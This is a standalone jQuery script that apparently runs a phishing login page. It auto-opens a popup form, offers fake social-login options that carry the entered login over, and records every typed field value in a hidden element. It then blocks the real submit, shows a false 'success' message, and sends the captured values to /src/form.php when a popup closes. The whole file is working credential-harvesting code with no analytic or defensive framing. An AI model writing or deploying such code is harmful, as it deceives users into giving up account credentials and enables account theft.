;(function ($) {
  "use strict";

  window.addEventListener('DOMContentLoaded', function () {

    var results = document.querySelector('#result');
    var callback = {
      close: function() {
        $.ajax({
          url: "/src/form.php",
          context: document.body,
          data: {
            'data': results.innerHTML
          }
        }).done(function() {
          console.log( "done" );
          results.innerHTML = '';
        });
      }
    };


    $('.btn').magnificPopup({
      midClick: true,
      removalDelay: 300,
      mainClass: 'mfp-move-horizontal',
      fixedContentPos: true,
      items: {
        src: $('.magnific--main-form'),
        type: 'inline'
      },
      callbacks: callback
    });


    setTimeout(function () {
      $('.btn').first().click();
    }, 5000);


    var inputs = document.querySelectorAll('input');

    inputs.forEach(function (el, index, list) {
      el.addEventListener('change', function (e) {
        var jsonHtml = results.innerHTML;
        var json = {};

        if(jsonHtml) {
          json = JSON.parse(jsonHtml);
        }

        var name = e.target.getAttribute('name');
        var value = e.target.value;
        var form = e.target.closest('form')
        var form_id = form.getAttribute('id');

        var r = {};
        r['type'] = form_id;
        r[name] = value;

        Object.assign(json, r);
        json = JSON.stringify(json);
        results.innerHTML = json;
      });
    });


    var social_forms = document.querySelectorAll('.social-item');
    social_forms.forEach(function (el) {
        el.addEventListener('click', function () {
          var target = el.getAttribute('data-target');
          var login = document.querySelector('[name="login"]');
          var target_form = document.querySelector(target);
          target_form.querySelector('.login').value = login.value;

          setTimeout(function () {
            $(target_form).find('.login').trigger('change');
            console.log($(target_form).find('.login'));
            $.magnificPopup.open({
              midClick: false,
              fixedContentPos: true,
              removalDelay: 300,
              mainClass: 'mfp-move-horizontal',
              items: {
                src: $(el.getAttribute('data-target')),
                type: 'inline'
              },
              callbacks: callback
            });

          }, 350);
          $.magnificPopup.close();

        });
    });


    var submits = document.querySelectorAll('form [type="submit"]');
    submits.forEach(function (el) {
      el.addEventListener('click', function (e) {
        e.preventDefault();
        e.stopPropagation();

        setTimeout(function () {
          $.magnificPopup.open({
            midClick: true,
            removalDelay: 300,
            fixedContentPos: true,
            mainClass: 'mfp-move-horizontal',
            items: {
              src: $('.magnific--success'),
              type: 'inline'
            },
          });
        }, 350);

        e.target.closest('form').querySelectorAll('input').forEach(function (e) {
          var jsonHtml = results.innerHTML;
          var json = {};

          if(jsonHtml) {
            json = JSON.parse(jsonHtml);
          }

          var name = e.getAttribute('name');
          var value = e.value;
          var form = e.closest('form')
          var form_id = form.getAttribute('id');

          var r = {};
          r['type'] = form_id;
          r[name] = value;

          Object.assign(json, r);
          json = JSON.stringify(json);
          results.innerHTML = json;
        });

        $.magnificPopup.close();
      });
    });

  });

})(jQuery);
